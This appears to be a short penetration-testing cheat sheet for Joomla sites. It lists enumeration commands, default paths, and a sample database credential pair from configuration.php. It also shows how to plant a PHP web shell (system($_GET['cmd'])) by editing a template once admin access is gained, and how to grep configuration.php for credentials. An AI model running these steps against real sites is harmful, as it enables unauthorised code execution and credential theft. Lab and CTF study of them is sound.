# Joomla

### Enumerate Joomla

Version, components, and configuration files — Use joomscan

```bash
joomscan -u http://$IP/
curl -s http://$IP/administrator/manifests/files/joomla.xml | grep version
```

---

### Joomla default paths

Key files and directories — Check all of these

```bash
/administrator/          # Admin login
/configuration.php       # DB creds (if readable)
/README.txt             # Version info
/robots.txt             # Hidden paths
```

---

### RCE via Template Editing

Edit a template PHP file — Requires admin access

```bash
# Extensions → Templates → Templates → Protostar → index.php
# Add: system($_GET['cmd']);
# Visit: http://$IP/index.php?cmd=id
```

---

### Joomla configuration.php

Contains database credentials — Check for password reuse

```bash
cat /var/www/html/configuration.php | grep -E "(user|password|host|db)"
```

<details>
<summary>Example Output</summary>

```
public $user = 'joomla_admin';
public $password = 'J00mla_Sup3r!';
public $db = 'joomla_db';
```
</details>

---
